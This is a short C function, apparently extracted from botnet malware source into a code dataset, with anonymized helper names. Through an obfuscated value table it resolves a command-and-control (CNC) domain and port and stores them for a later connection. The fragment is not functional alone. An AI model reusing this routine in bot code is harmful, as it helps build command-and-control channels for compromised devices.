#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct resolv_entries {size_t addrs_len; int /*<<< orphan*/ * addrs; } ;
typedef  int /*<<< orphan*/  port_t ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct TYPE_4__ {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; } ;

/* Variables and functions */
 int /*<<< orphan*/  TABLE_CNC_DOMAIN ; 
 int /*<<< orphan*/  TABLE_CNC_PORT ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 size_t FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 (struct resolv_entries*) ; 
 struct resolv_entries* FUNC3 (scalar_t__) ; 
 TYPE_2__ srv_addr ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 

__attribute__((used)) static void FUNC7(void)
{
    struct resolv_entries *entries;

    FUNC6(TABLE_CNC_DOMAIN);
    entries = FUNC3(FUNC5(TABLE_CNC_DOMAIN, NULL));
    FUNC4(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[main] Failed to resolve CNC address\n");
#endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[FUNC1() % entries->addrs_len];
    FUNC2(entries);

    FUNC6(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)FUNC5(TABLE_CNC_PORT, NULL));
    FUNC4(TABLE_CNC_PORT);

#ifdef DEBUG
    printf("[main] Resolved domain\n");
#endif
}